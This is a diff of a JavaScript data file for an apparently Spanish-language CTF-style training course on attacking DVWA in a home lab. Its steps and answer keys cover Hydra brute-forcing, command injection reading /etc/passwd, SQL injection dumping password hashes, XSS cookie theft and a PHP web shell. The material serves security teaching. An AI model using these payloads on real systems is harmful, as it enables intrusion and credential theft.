+      flagsAceptadas: ["GET", "get", "Get", "FLAG{prep-burp-intercepcion-dvwa-exitosa}"],
+      objetivoFlag: 'Activa la intercepcion con FoxyProxy en modo Burp y envia una peticion HTTP a DVWA haciendo Forward con exito.'
     }
   ]
 };
@@ -104,26 +331,105 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Inicio de sesion en DVWA y ajuste del nivel de seguridad',
-            como: '1. Abre Firefox con FoxyProxy en modo "Burp" y navega a la URL de DVWA en tu Raspberry Pi.\n\n2. Escribe usuario "admin" y contrasena "password". Haz clic en "Login".\n\n3. En el menu lateral de DVWA, haz clic en "DVWA Security", selecciona "Low" en el menu desplegable y presiona "Submit". En este nivel no se aplicaran filtros de sanitizacion.',
-            payload: 'Usuario: admin\nContrasena: password\nSecurity Level: Low'
+            como: `Donde se hace: En el navegador Firefox (asegúrate de que en Burp Suite "Intercept is off" para navegar libremente).
+
+Objetivo: Iniciar sesión por primera vez en la aplicación de práctica DVWA y fijar la dificultad en el nivel más sencillo ("Low").
+
+Paso a paso:
+1. Abre Firefox y navega a la URL de DVWA en tu Raspberry Pi (por ejemplo: http://192.168.1.50/dvwa/).
+2. En la pantalla de bienvenida, escribe las credenciales por defecto:
+   • Username: admin
+   • Password: password
+   Luego haz clic en el botón azul "Login".
+3. En el menú lateral izquierdo de DVWA, busca y haz clic en la opción "DVWA Security".
+4. En el menú desplegable, selecciona "Low" (Bajo) y presiona el botón "Submit".
+
+¿Por qué hacemos esto?: El nivel "Low" desactiva todas las protecciones del código para que puedas ver y entender con total claridad cómo ocurren los fallos de seguridad sin toparte con filtros complejos.
+
+Como saber que funciono: En la parte inferior de la pantalla o en el mensaje verde verás: "Security Level set to low".`,
+            payload: 'Usuario: admin\nContrasena: password\nSecurity Level: Low',
+            flag: 'FLAG{dvwa-security-low-ready}',
+            dondeEncontrarla: 'En la pantalla de DVWA, observando el mensaje de confirmación o el pie de página.',
+            quePoner: 'Escribe el nivel de seguridad configurado: low',
+            flagsAceptadas: ["low", "Low", "LOW", "Security Level set to low", "FLAG{dvwa-security-low-ready}"],
+            objetivoFlag: 'Ingresa la flag una vez hayas iniciado sesion correctamente como admin y veas "Security Level set to low" en DVWA.'
           },
           {
             numero: 2,
-            titulo: 'Capturar peticion de autenticacion',
-            como: '1. En el menu lateral izquierdo de DVWA, haz clic en "Brute Force".\n\n2. Escribe cualquier nombre de usuario y contrasena de prueba.\n\n3. Asegurate de que en Burp Suite este activado "Intercept is on" y haz clic en "Login". Observa los parametros que viajan en la peticion HTTP GET.',
-            payload: 'GET /dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login'
+            titulo: 'Capturar peticion de autenticacion con Burp Suite',
+            como: `Donde se hace: Con Firefox y Burp Suite trabajando juntos.
+
+Objetivo: "Pausar" en el aire un intento de inicio de sesión para ver qué datos envía el navegador hacia el servidor.
+
+Paso a paso:
+1. En el menú lateral izquierdo de DVWA, haz clic en la sección "Brute Force".
+2. Ve a Burp Suite, entra a la pestaña "Proxy" -> "Intercept" y asegúrate de que el botón diga "Intercept is on" (activado).
+3. En Firefox, activa el perfil "Burp" en tu extensión FoxyProxy.
+4. En el formulario de login de DVWA, escribe un usuario cualquiera (ej: admin) y una contraseña inventada (ej: prueba123), y haz clic en el botón "Login".
+5. Cambia a la ventana de Burp Suite: verás la petición detenida en pantalla. Observa la primera línea que empieza con:
+   GET /dvwa/vulnerabilities/brute/?username=admin&password=prueba123...
+
+¿Qué significa esto?: Los datos viajan en texto plano como parámetros en la propia dirección web (URL) mediante el método HTTP GET.`,
+            payload: 'GET /dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login',
+            flag: 'FLAG{brute-get-params-captured}',
+            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept. Puedes ingresar la línea GET completa capturada o el parámetro de usuario (username).',
+            quePoner: 'Escribe el nombre del parámetro donde viaja el usuario: username',
+            flagsAceptadas: [
+              "username",
+              "admin",
+              "username=admin",
+              "vulnerabilities/brute",
+              "GET /vulnerabilities/brute",
+              "GET /dvwa/vulnerabilities/brute",
+              "GET /vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1",
+              "GET /dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1",
+              "FLAG{brute-get-params-captured}"
+            ],
+            objetivoFlag: 'Ingresa la flag cuando veas la peticion GET interceptada en Burp Suite con los parametros username y password visibles.'
           },
           {
             numero: 3,
             titulo: 'Identificar mensaje de fallo',
-            como: '1. En Burp Suite, pulsa "Forward" para enviar la peticion de prueba y revisa la respuesta del servidor.\n\n2. Observa que cuando las credenciales son erroneas, la aplicacion muestra "Username and/or password incorrect.".\n\n3. Esta cadena es la que utilizaran las herramientas automatizadas para saber cuando un intento fallo.',
-            payload: 'Cadena de fallo: Username and/or password incorrect.'
+            como: `Donde se hace: En Burp Suite y en el navegador Firefox.
+
+Objetivo: Descubrir qué mensaje exacto muestra la página web cuando la contraseña es errónea, para que una herramienta automática sepa cuándo falló un intento.
+
+Paso a paso:
+1. En Burp Suite, haz clic en el botón "Forward" para dejar pasar la petición con contraseña errónea.
+2. En Firefox, desactiva temporalmente el proxy (en FoxyProxy elige "Disable" o en Burp pon "Intercept is off").
+3. Observa el mensaje de error rojo que aparece debajo del formulario en DVWA. Dice textualmente:
+   Username and/or password incorrect.
+
+¿Por qué es necesario?: Los programas automáticos de ataque no ven la pantalla como una persona; necesitan buscar esa frase textual en el código recibido para saber si la contraseña fue rechazada o si lograron entrar.`,
+            payload: 'Cadena de fallo: Username and/or password incorrect.',
+            flag: 'FLAG{brute-fail-string-identified}',
+            dondeEncontrarla: 'En el mensaje de error rojo que muestra DVWA tras enviar una contraseña incorrecta.',
+            quePoner: 'Escribe el mensaje de error que viste: Username and/or password incorrect.',
+            flagsAceptadas: ["Username and/or password incorrect.", "Username and/or password incorrect", "username and/or password incorrect.", "incorrect", "FLAG{brute-fail-string-identified}"],
+            objetivoFlag: 'Ingresa la flag cuando puedas leer el mensaje exacto de error en la respuesta HTTP de DVWA para credenciales incorrectas.'
           },
           {
             numero: 4,
             titulo: 'Lanzar ataque automatizado con Hydra',
-            como: '1. DVWA usa una cookie llamada PHPSESSID para reconocer tu sesion.\n\n2. Para obtener su valor: con sesion iniciada en DVWA, presiona F12 -> "Aplicacion" (Chrome) o "Almacenamiento" (Firefox) -> "Cookies" -> busca la fila PHPSESSID y copia su valor.\n\n3. Abre la terminal de tu maquina Kali Linux y ejecuta el comando Hydra reemplazando <COOKIE> por el valor de PHPSESSID copiado.',
-            payload: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_LAB> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<COOKIE>"'
+            como: `Donde se hace: En la terminal de tu máquina Kali Linux.
+
+Objetivo: Usar la herramienta Hydra para probar automáticamente miles de contraseñas por segundo desde el diccionario rockyou.txt hasta descifrar la clave del administrador.
+
+Paso a paso:
+1. Para que el servidor reconozca tu sesión de DVWA, necesitas tu cookie llamada PHPSESSID.
+2. En Firefox (con sesión iniciada en DVWA), presiona F12 para abrir las herramientas de desarrollador. Ve a "Almacenamiento" (o "Storage") -> "Cookies" -> haz clic en la IP de tu Pi y copia el valor de la fila PHPSESSID (es una cadena alfanumérica).
+3. En la terminal de Kali Linux, pega este comando reemplazando <IP_LAB> por la IP de tu Raspberry Pi y <COOKIE> por el valor de tu PHPSESSID:
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_LAB> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<COOKIE>"
+4. Presiona Enter. Hydra comenzará a probar palabras hasta que se detenga y muestre en verde:
+   [80][http-get-form] host: <IP> login: admin password: password
+
+¿Qué hace este comando?: -l define el usuario objetivo (admin), -P indica la lista de contraseñas rockyou.txt, y :F=incorrect le dice a Hydra que ignore las respuestas que contengan la palabra "incorrect".`,
+            payload: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_LAB> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<COOKIE>"',
+            flag: 'FLAG{hydra-cracked-admin-password}',
+            dondeEncontrarla: 'En la salida de tu terminal de Kali Linux al terminar Hydra, en la línea que indica password encontrada.',
+            quePoner: 'Escribe la contraseña que descubrió Hydra para admin: password',
+            flagsAceptadas: ["password", "Password", "admin:password", "FLAG{password}", "FLAG{hydra-cracked-admin-password}"],
+            objetivoFlag: 'Ingresa la flag cuando Hydra muestre en pantalla "[80][http-get-form] host: <IP> login: admin password: password" confirmando la contrasena encontrada.'
           }
         ]
       },
@@ -136,20 +442,65 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Verificar funcionamiento legitimo',
-            como: '1. En el menu lateral izquierdo de DVWA, haz clic en "Command Injection".\n\n2. En el campo "Enter an IP address", escribe "127.0.0.1" y presiona "Submit".\n\n3. Veras la respuesta devuelta por el comando ping que el servidor ejecuto internamente en la Raspberry Pi.',
-            payload: '127.0.0.1'
+            como: `Donde se hace: En Firefox, en la sección "Command Injection" de DVWA.
+
+Objetivo: Comprender cuál es el uso legítimo previsto para este formulario (comprobar la conectividad enviando un ping a una dirección IP).
+
+Paso a paso:
+1. En el menú lateral de DVWA, haz clic en "Command Injection".
+2. En la casilla "Enter an IP address", escribe: 127.0.0.1 (la dirección local de tu propio equipo).
+3. Haz clic en el botón "Submit".
+4. Espera 2 o 3 segundos. Verás aparecer un cuadro negro con la respuesta típica del comando ping generado internamente por la Raspberry Pi.
+
+¿Qué está ocurriendo?: El servidor web toma el texto que escribiste y ejecuta internamente en el sistema operativo Linux la orden: ping -c 4 127.0.0.1.`,
+            payload: '127.0.0.1',
+            flag: 'FLAG{cmdi-ping-response-seen}',
+            dondeEncontrarla: 'En el recuadro negro debajo del formulario donde se muestra la salida del comando ping.',
+            quePoner: 'Escribe el tamaño en bytes de los paquetes reportado en el ping: 64 bytes (o simplemente 64)',
+            flagsAceptadas: ["64 bytes", "64", "64 bytes from 127.0.0.1", "FLAG{cmdi-ping-response-seen}"],
+            objetivoFlag: 'Ingresa la flag cuando veas la salida del comando ping devuelta por el servidor, con lineas como "64 bytes from 127.0.0.1" en la pagina.'
           },
           {
             numero: 2,
             titulo: 'Concatenar segundo comando con punto y coma',
-            como: '1. Vuelve al campo "Enter an IP address".\n\n2. Escribe la direccion IP seguida de un punto y coma y el comando "whoami".\n\n3. Haz clic en "Submit". El punto y coma indica al SO que ejecute ambos comandos consecutivamente, imprimiendo el usuario del servidor web (www-data).',
-            payload: '127.0.0.1; whoami'
+            como: `Donde se hace: En el mismo campo "Enter an IP address" de Command Injection en DVWA.
+
+Objetivo: Engañar al servidor para que, además del ping, ejecute un segundo comando del sistema operativo que nosotros elijamos.
+
+Paso a paso:
+1. En la casilla "Enter an IP address", escribe la IP seguida de un punto y coma y la orden whoami:
+   127.0.0.1; whoami
+2. Haz clic en "Submit".
+3. Mira la parte inferior del recuadro negro de resultados: justo debajo del ping verás aparecer la palabra www-data.
+
+¿Por qué funciona?: En Linux, el símbolo punto y coma (;) sirve para separar dos órdenes independientes. El servidor ejecuta el ping y enseguida ejecuta whoami ("¿quién soy?"). Como el servidor web corre bajo el usuario web del sistema operativo, responde www-data.`,
+            payload: '127.0.0.1; whoami',
+            flag: 'FLAG{cmdi-whoami-www-data}',
+            dondeEncontrarla: 'En el recuadro negro de la página justo debajo del resultado de ping, donde aparece el usuario.',
+            quePoner: 'Escribe el nombre del usuario web del sistema que apareció: www-data',
+            flagsAceptadas: ["www-data", "www data", "FLAG{www-data}", "FLAG{cmdi-whoami-www-data}"],
+            objetivoFlag: 'Ingresa la flag cuando veas "www-data" impreso en la respuesta como resultado del comando whoami ejecutado en el servidor.'
           },
           {
             numero: 3,
             titulo: 'Extraer cuentas del sistema operativo',
-            como: '1. En el mismo campo, introduce la secuencia para leer el archivo "/etc/passwd".\n\n2. Haz clic en "Submit".\n\n3. La aplicacion mostrara el listado completo de usuarios y cuentas de servicio del sistema operativo de la Raspberry Pi.',
-            payload: '127.0.0.1; cat /etc/passwd'
+            como: `Donde se hace: En la casilla "Enter an IP address" de Command Injection en DVWA.
+
+Objetivo: Leer el archivo confidencial /etc/passwd del sistema Linux de la Raspberry Pi para listar las cuentas de usuario existentes.
+
+Paso a paso:
+1. En la casilla de texto, escribe la orden para leer el archivo del sistema:
+   127.0.0.1; cat /etc/passwd
+2. Haz clic en el botón "Submit".
+3. La página mostrará una lista completa de cuentas del sistema operativo, comenzando por el superusuario root:x:0:0:root:...
+
+¿Cuál es la lección de seguridad?: Nunca se debe concatenar directamente la entrada de un usuario en un comando del sistema. Los atacantes pueden usar esto para tomar control absoluto del servidor.`,
+            payload: '127.0.0.1; cat /etc/passwd',
+            flag: 'FLAG{cmdi-etcpasswd-dumped}',
+            dondeEncontrarla: 'En la salida de texto en pantalla, observando la primera cuenta del archivo con UID 0.',
+            quePoner: 'Escribe el nombre del superusuario con UID 0 que aparece al inicio: root',
+            flagsAceptadas: ["root", "root:x:0:0:root", "FLAG{root}", "FLAG{cmdi-etcpasswd-dumped}"],
+            objetivoFlag: 'Ingresa la flag cuando veas el contenido de /etc/passwd mostrado en la pagina, con lineas como "root:x:0:0:root" y "www-data:x:33:33".'
           }
         ]
       },
@@ -162,26 +513,89 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Provocar fallo de sintaxis en la consulta',
-            como: "1. En el menu lateral de DVWA, entra a \"SQL Injection\".\n\n2. En el campo \"User ID\", escribe unicamente una comilla simple ( ' ) y presiona \"Submit\".\n\n3. Observa el mensaje de error de MySQL: confirma que la entrada del usuario se inserta directamente en la consulta SQL sin estar parametrizada.",
-            payload: "'"
+            como: `Donde se hace: En Firefox, en la sección "SQL Injection" de DVWA.
+
+Objetivo: Romper intencionalmente la consulta de base de datos introduciendo una comilla simple (') para comprobar si la entrada no está protegida.
+
+Paso a paso:
+1. En el menú de DVWA, haz clic en "SQL Injection".
+2. En la casilla "User ID", escribe únicamente una comilla simple: '
+3. Haz clic en el botón "Submit".
+4. Verás aparecer un mensaje de error técnico de base de datos en color rojo o negro:
+   You have an error in your SQL syntax; check the manual that corresponds to your MariaDB/MySQL server version...
+
+¿Por qué ocurre esto?: El programador escribió internamente algo como SELECT ... WHERE user_id = '$id'. Al enviar una comilla, la consulta queda con tres comillas desparejadas, la base de datos se confunde y arroja error. ¡Eso confirma que el campo es vulnerable!`,
+            payload: "'",
+            flag: 'FLAG{sqli-mysql-error-visible}',
+            dondeEncontrarla: 'En el mensaje de error de sintaxis SQL que aparece en la página.',
+            quePoner: 'Escribe el motor de base de datos mencionado en el error: MySQL (o MariaDB)',
+            flagsAceptadas: ["MySQL", "mysql", "MariaDB", "mariadb", "FLAG{sqli-mysql-error-visible}"],
+            objetivoFlag: 'Ingresa la flag cuando veas el mensaje de error SQL de MySQL en la pagina, con texto como "You have an error in your SQL syntax".'
           },
           {
             numero: 2,
             titulo: 'Evasion booleana de la condicion',
-            como: '1. En el campo "User ID", escribe la sentencia de evasion booleana.\n\n2. Haz clic en "Submit".\n\n3. La condicion 1=1 siempre se cumple, por lo que la consulta ignorara el filtro de usuario y devolvera todos los usuarios de la base de datos.',
-            payload: "1' OR '1'='1"
+            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.
+
+Objetivo: Hacer que la base de datos nos devuelva TODOS los usuarios en lugar de uno solo, usando una condición lógica que siempre sea verdadera ('1'='1').
+
+Paso a paso:
+1. En la casilla "User ID", escribe exactamente:
+   1' OR '1'='1
+2. Haz clic en "Submit".
+3. En vez de mostrarte solo un registro, la página te devolverá la lista completa de todos los usuarios de la base de datos: admin, gordonb, 1337, pablo, smithy.
+
+¿Por qué funciona?: La consulta se transforma en: "Trae el usuario 1 O donde 1 sea igual a 1". Como uno siempre es igual a uno en matemáticas, la condición se cumple para todas las filas y la base de datos devuelve la tabla entera.`,
+            payload: "1' OR '1'='1",
+            flag: 'FLAG{sqli-all-users-bypassed}',
+            dondeEncontrarla: 'En la lista de resultados de usuarios devuelta por DVWA.',
+            quePoner: 'Escribe el primer nombre de usuario que aparece en la lista: admin',
+            flagsAceptadas: ["admin", "Admin", "FLAG{admin}", "FLAG{sqli-all-users-bypassed}"],
+            objetivoFlag: 'Ingresa la flag cuando la pagina muestre todos los usuarios de la base de datos (admin, gordonb, 1337, pablo, smithy) en una sola respuesta.'
           },
           {
             numero: 3,
             titulo: 'Determinar numero de columnas con ORDER BY',
-            como: '1. En "User ID", introduce la instruccion de ordenamiento para calcular cuantas columnas devuelve la consulta original.\n\n2. Prueba con numeros crecientes (1, 2, 3...) hasta que el servidor arroje un error.\n\n3. El numero que cause el error indicara el numero exacto de columnas para formular un UNION SELECT.',
-            payload: "1' ORDER BY 2 #"
+            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.
+
+Objetivo: Averiguar cuántas columnas devuelve la consulta original (un dato fundamental antes de poder pedirle contraseñas a la base de datos).
+
+Paso a paso:
+1. En "User ID", escribe: 1' ORDER BY 1 # y haz clic en Submit (verás que responde bien).
+2. Ahora escribe: 1' ORDER BY 2 # y haz clic en Submit (sigue respondiendo bien).
+3. Ahora escribe: 1' ORDER BY 3 # y haz clic en Submit: la página dará un error como "Unknown column '3' in 'order list'".
+
+¿Qué significa esto?: Cuando ordenas por 2 columnas funciona, pero al pedir la columna 3 falla. Eso demuestra que la consulta original tiene exactamente 2 columnas. El símbolo # sirve para anular o comentar el resto del código SQL original.`,
+            payload: "1' ORDER BY 2 #",
+            flag: 'FLAG{sqli-2-columns-confirmed}',
+            dondeEncontrarla: 'Al verificar con qué número responde bien y con cuál da error de columna desconocida.',
+            quePoner: 'Escribe el número exacto de columnas que contiene la consulta: 2',
+            flagsAceptadas: ["2", "dos", "2 columnas", "FLAG{sqli-2-columns-confirmed}"],
+            objetivoFlag: 'Ingresa la flag cuando ORDER BY 2 funcione sin error pero ORDER BY 3 devuelva error, confirmando que la consulta tiene exactamente 2 columnas.'
           },
           {
             numero: 4,
             titulo: 'Extraer usuarios y hashes de contrasenas',
-            como: '1. Escribe en "User ID" el comando UNION SELECT solicitando las columnas "user" y "password" de la tabla "users".\n\n2. Haz clic en "Submit".\n\n3. El servidor combinara la respuesta y mostrara todos los nombres de usuario junto a sus contrasenas en formato hash MD5.',
-            payload: "1' UNION SELECT user, password FROM users #"
+            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.
+
+Objetivo: Usar la cláusula UNION SELECT para robar los usuarios y las contraseñas cifradas guardadas en la tabla users.
+
+Paso a paso:
+1. En la casilla "User ID", escribe:
+   1' UNION SELECT user, password FROM users #
+2. Haz clic en "Submit".
+3. La página mostrará los nombres de usuario acompañados por sus contraseñas en formato hash MD5 (un texto largo de 32 caracteres).
+4. Para el usuario admin, verás el hash:
+   5f4dcc3b5aa765d61d8327deb882cf99
+   (este hash corresponde a la palabra "password").
+
+¿Cómo funciona UNION SELECT?: UNION permite combinar el resultado de la consulta original con una consulta propia. Como ya sabíamos que requería 2 columnas, le pedimos las columnas user y password de la tabla users.`,
+            payload: "1' UNION SELECT user, password FROM users #",
+            flag: 'FLAG{sqli-md5-hashes-dumped}',
+            dondeEncontrarla: 'En la tabla de resultados de DVWA junto al usuario admin.',
+            quePoner: 'Escribe el hash MD5 de la contraseña de admin: 5f4dcc3b5aa765d61d8327deb882cf99',
+            flagsAceptadas: ["5f4dcc3b5aa765d61d8327deb882cf99", "FLAG{5f4dcc3b5aa765d61d8327deb882cf99}", "FLAG{sqli-md5-hashes-dumped}"],
+            objetivoFlag: 'Ingresa la flag cuando veas los hashes MD5 de las contrasenas en la pagina, por ejemplo el hash "5f4dcc3b5aa765d61d8327deb882cf99" junto al usuario admin.'
           }
         ]
       },
@@ -194,20 +608,65 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Identificar punto de reflexion de datos',
-            como: '1. En el menu lateral de DVWA, haz clic en "XSS (Reflected)".\n\n2. En "What is your name?", escribe "PruebaLab" y presiona "Submit".\n\n3. Observa como el servidor imprime de regreso exactamente la palabra que enviaste ("Hello PruebaLab").',
-            payload: 'PruebaLab'
+            como: `Donde se hace: En Firefox, en la sección "XSS (Reflected)" de DVWA.
+
+Objetivo: Comprobar si el texto que ingresas en el formulario es devuelto e impreso tal cual por el servidor en la página web.
+
+Paso a paso:
+1. En el menú de DVWA, entra a "XSS (Reflected)".
+2. En la casilla que dice "What's your name?", escribe: PruebaLab
+3. Haz clic en el botón "Submit".
+4. Verás que la página responde con un saludo que dice: Hello PruebaLab.
+
+¿Por qué es un riesgo?: Si el servidor imprime lo que tú le mandas sin "desinfectarlo" (sanitizar caracteres especiales como < o >), un atacante puede inyectar código de programación en vez de un simple nombre.`,
+            payload: 'PruebaLab',
+            flag: 'FLAG{xss-reflected-hello-pruebalab}',
+            dondeEncontrarla: 'En el saludo de respuesta que aparece en la página tras pulsar Submit.',
+            quePoner: 'Escribe la frase completa de saludo reflejada en pantalla: Hello PruebaLab',
+            flagsAceptadas: ["Hello PruebaLab", "hello pruebalab", "PruebaLab", "FLAG{xss-reflected-hello-pruebalab}"],
+            objetivoFlag: 'Ingresa la flag cuando la pagina muestre exactamente "Hello PruebaLab" como respuesta, confirmando que el servidor refleja tu entrada sin sanitizacion.'
           },
           {
             numero: 2,
             titulo: 'Inyectar codigo JavaScript ejecutable',
-            como: '1. En el campo "What is your name?", introduce una etiqueta script con una funcion de alerta.\n\n2. Haz clic en "Submit".\n\n3. El navegador interpretara la etiqueta como JavaScript legitimo y desplegara un cuadro de alerta emergente con el texto "XSS".',
-            payload: "<script>alert('XSS')</script>"
+            como: `Donde se hace: En la misma casilla "What's your name?" de XSS (Reflected).
+
+Objetivo: Hacer que el navegador ejecute una ventana emergente de alerta utilizando una etiqueta <script> de JavaScript.
+
+Paso a paso:
+1. En la casilla "What's your name?", escribe exactamente:
+   <script>alert('XSS')</script>
+2. Haz clic en el botón "Submit".
+3. En la parte superior de tu navegador saltará una ventana emergente (pop-up) con el texto "XSS".
+
+¿Qué acaba de pasar?: El navegador web no diferenció entre el contenido normal de la página y tu código inyectado; creyó que era una instrucción legítima de los creadores de la web y ejecutó la función alert('XSS').`,
+            payload: "<script>alert('XSS')</script>",
+            flag: 'FLAG{xss-alert-executed-success}',
+            dondeEncontrarla: 'En el cuadro emergente de alerta que salta en la parte superior del navegador.',
+            quePoner: 'Escribe el texto que aparece dentro de la alerta emergente: XSS',
+            flagsAceptadas: ["XSS", "xss", "FLAG{xss-alert-executed-success}"],
+            objetivoFlag: 'Ingresa la flag cuando veas el cuadro de alerta emergente con el texto "XSS" en tu navegador al hacer Submit del payload.'
           },
           {
             numero: 3,
             titulo: 'Demostrar robo de cookie de sesion',
-            como: '1. Introduce el payload para leer "document.cookie" en el campo "What is your name?".\n\n2. Presiona "Submit".\n\n3. El cuadro emergente mostrara el identificador de sesion actual (PHPSESSID), demostrando como un atacante podria secuestrar cuentas.',
-            payload: '<script>alert(document.cookie)</script>'
+            como: `Donde se hace: En la misma casilla "What's your name?" de XSS (Reflected).
+
+Objetivo: Demostrar cómo un atacante puede usar XSS para leer las cookies secretas que mantienen iniciada tu sesión en la web.
+
+Paso a paso:
+1. En la casilla "What's your name?", escribe:
+   <script>alert(document.cookie)</script>
+2. Haz clic en "Submit".
+3. En la ventana emergente verás tu identificador de sesión: security=low; PHPSESSID=...
+
+¿Cuál es el peligro real de esto?: Si un atacante convence a una víctima de hacer clic en un enlace con este código, el script puede enviar en secreto esa cookie a su propio servidor y entrar a la cuenta de la víctima sin saber su contraseña.`,
+            payload: '<script>alert(document.cookie)</script>',
+            flag: 'FLAG{xss-cookie-phpsessid-leaked}',
+            dondeEncontrarla: 'En la ventana emergente generada al ejecutar document.cookie.',
+            quePoner: 'Escribe el nombre de la cookie de sesión de PHP: PHPSESSID',
+            flagsAceptadas: ["PHPSESSID", "phpsessid", "FLAG{xss-cookie-phpsessid-leaked}"],
+            objetivoFlag: 'Ingresa la flag cuando el alert emergente muestre tu valor de PHPSESSID (por ejemplo: "security=low; PHPSESSID=abc123..."), confirmando el robo de sesion.'
           }
         ]
       },
@@ -220,20 +679,66 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Modificar limite de caracteres en el navegador',
-            como: '1. En el menu lateral, haz clic en "XSS (Stored)".\n\n2. Clic derecho sobre la caja "Name" -> "Inspeccionar".\n\n3. En el arbol HTML, localiza el atributo maxlength="10" en la etiqueta input y cambialo a maxlength="200" para permitir payloads mas largos.',
-            payload: 'maxlength="200"'
+            como: `Donde se hace: En Firefox, en la sección "XSS (Stored)" de DVWA.
+
+Objetivo: Usar las herramientas de desarrollo del navegador (F12) para quitar una restricción visual que limita a 10 letras lo que podemos escribir.
+
+Paso a paso:
+1. En el menú de DVWA, haz clic en "XSS (Stored)".
+2. Verás un libro de visitas con los campos "Name" (Nombre) y "Message" (Mensaje). Si intentas escribir en "Name", verás que se detiene al llegar a 10 caracteres.
+3. Haz clic derecho sobre la casilla "Name" y selecciona "Inspeccionar" (o presiona F12).
+4. En el código HTML que se abre abajo, verás la etiqueta: <input name="txtName" ... maxlength="10">.
+5. Haz doble clic sobre el número 10 y cámbialo por 200. Presiona Enter.
+6. Ahora podrás escribir textos mucho más largos en el campo "Name".
+
+Lección de seguridad para principiantes: Las protecciones puestas solo en el HTML del navegador (del lado del cliente) nunca son seguras, porque cualquier persona las puede modificar con las herramientas de desarrollador.`,
+            payload: 'maxlength="200"',
+            flag: 'FLAG{xss-stored-maxlength-bypassed}',
+            dondeEncontrarla: 'En las herramientas de desarrollo (F12 -> Inspector) sobre la etiqueta input del campo Name.',
+            quePoner: 'Escribe el nombre del atributo HTML que limitaba los caracteres: maxlength',
+            flagsAceptadas: ["maxlength", "max-length", "MAXLENGTH", "FLAG{xss-stored-maxlength-bypassed}"],
+            objetivoFlag: 'Ingresa la flag cuando hayas modificado el atributo maxlength a 200 en DevTools y el campo "Name" acepte mas de 10 caracteres sin restriccion.'
           },
           {
             numero: 2,
             titulo: 'Guardar el payload en la base de datos',
-            como: '1. En el formulario "Guestbook", escribe el payload JavaScript en "Name" y cualquier texto en "Message".\n\n2. Haz clic en "Sign Guestbook".\n\n3. El servidor guardara permanentemente el codigo JavaScript en la base de datos MySQL de la Raspberry Pi.',
-            payload: "Name: <script>alert('Stored')</script>\nMessage: Hola"
+            como: `Donde se hace: En el formulario de "Guestbook" de XSS (Stored) en DVWA.
+
+Objetivo: Guardar de forma permanente un código JavaScript en la base de datos MySQL del servidor de la Raspberry Pi.
+
+Paso a paso:
+1. En la casilla "Name", escribe exactamente:
+   <script>alert('Stored')</script>
+2. En la casilla "Message", escribe cualquier mensaje como: Hola mundo
+3. Haz clic en el botón "Sign Guestbook".
+4. Al instante saltará una ventana emergente que dice "Stored".
+
+¿Por qué es "Almacenado"?: A diferencia del XSS Reflejado (que desaparece en un segundo), el servidor guardó este comentario en su base de datos. Cada vez que alguien visite esta página, su navegador cargará el comentario y ejecutará el script.`,
+            payload: "Name: <script>alert('Stored')</script>\nMessage: Hola",
+            flag: 'FLAG{xss-stored-payload-saved-db}',
+            dondeEncontrarla: 'En la ventana de alerta que salta al hacer clic en Sign Guestbook.',
+            quePoner: 'Escribe la palabra configurada dentro de la alerta: Stored',
+            flagsAceptadas: ["Stored", "stored", "STORED", "FLAG{xss-stored-payload-saved-db}"],
+            objetivoFlag: 'Ingresa la flag cuando al hacer "Sign Guestbook" el alert emergente con "Stored" se dispare automaticamente, confirmando que el script fue guardado en la BD.'
           },
           {
             numero: 3,
             titulo: 'Verificar persistencia del ataque',
-            como: '1. Recarga la pagina con F5 o abre una ventana privada y visita la misma seccion.\n\n2. El script se ejecuta automaticamente cada vez que la pagina carga los comentarios, afectando a cualquier usuario que la visite.',
-            payload: 'F5 / Recargar pagina'
+            como: `Donde se hace: En el navegador Firefox.
+
+Objetivo: Comprobar que el ataque quedó guardado permanentemente y se ejecuta de manera automática cada vez que se carga la página.
+
+Paso a paso:
+1. Presiona la tecla F5 para recargar la página (o abre una ventana de incógnito y entra a la misma sección).
+2. Observa cómo la ventana emergente con "Stored" se dispara automáticamente sin que tengas que volver a escribir nada.
+
+Impacto de esta vulnerabilidad: En una red social o foro real, cualquier persona que entre a leer los comentarios resultaría atacada automáticamente, sin necesidad de hacer ningún clic sospechoso.`,
+            payload: 'F5 / Recargar pagina',
+            flag: 'FLAG{xss-stored-persists-on-reload}',
+            dondeEncontrarla: 'Al recargar la página con F5 o abrirla en una ventana privada.',
+            quePoner: 'Escribe el texto de la alerta que se vuelve a disparar al recargar: Stored',
+            flagsAceptadas: ["Stored", "stored", "FLAG{xss-stored-persists-on-reload}"],
+            objetivoFlag: 'Ingresa la flag cuando al recargar la pagina XSS Stored (o abrirla en ventana privada) el alert "Stored" se ejecute automaticamente sin intervenir.'
           }
         ]
       },
@@ -246,20 +751,68 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Crear archivo Web Shell en PHP',
-            como: '1. En tu maquina Kali Linux, abre un editor de texto (mousepad, gedit o nano).\n\n2. Escribe el codigo PHP que recibe parametros GET y los ejecuta en la funcion system().\n\n3. Guarda el archivo como "shell.php".',
-            payload: '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
+            como: `Donde se hace: En tu máquina Kali Linux (en una terminal).
+
